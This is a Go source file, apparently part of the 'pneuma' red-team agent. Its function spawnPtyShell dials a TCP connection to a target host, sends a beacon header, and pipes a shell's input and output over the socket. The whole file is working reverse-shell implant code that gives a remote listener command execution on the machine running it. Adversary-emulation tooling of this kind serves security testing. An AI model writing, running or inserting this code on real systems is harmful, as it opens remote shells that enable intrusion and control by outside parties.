package pty

import (
	"context"
	"github.com/preludeorg/pneuma/util"
	"net"
	"os/exec"
)

func spawnPtyShell(target, executor string, agent *util.AgentConfig) (int, int, error) {
	header, err := agent.BuildSocketBeacon("piped")
	conn, dialErr := net.Dial("tcp", target)
	if err == nil && dialErr == nil {
		ctx, cancel := context.WithCancel(context.Background())
		shell := exec.CommandContext(ctx, executor)
		go cancelOnSocketClose(cancel, conn)
		conn.Write(header)
		shell.Stdout = conn
		shell.Stdin = conn
		shell.Stderr = conn
		if err = shell.Start(); err == nil {
			return shell.Process.Pid, 0, nil
		}
	}
	return agent.Pid, 1, err
}